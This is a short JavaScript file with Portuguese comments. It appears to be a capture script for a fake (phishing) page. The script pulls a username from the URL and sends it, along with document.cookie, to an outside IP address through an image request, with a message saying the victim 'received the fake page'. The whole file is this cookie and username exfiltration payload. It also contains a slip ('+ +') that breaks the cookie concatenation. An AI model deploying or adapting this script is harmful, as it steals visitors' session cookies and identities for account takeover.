//Captura todo o conteudo da URL
var url   = window.location.search.replace("?", "");

//Recupera o nome do usuario enviado por GET
var items = url.split("&");
var array = {
'usuario' : items[0],
}

//Retira o %20 referente aos espaços e substitui pos underline
str = array.usuario
var busca = "%20"; 
var strbusca = eval('/'+busca+'/g');
str2 = str.replace(strbusca, "_");

new Image().src = "http://192.168.0.123/?=" + str2 + + document.cookie +"_Recebeu_a_pagina_falsa_aguarde_captura...."

// Para Testes
//alert(str2);
//alert('captura usuario / editar arquivo captura_usuario.js')

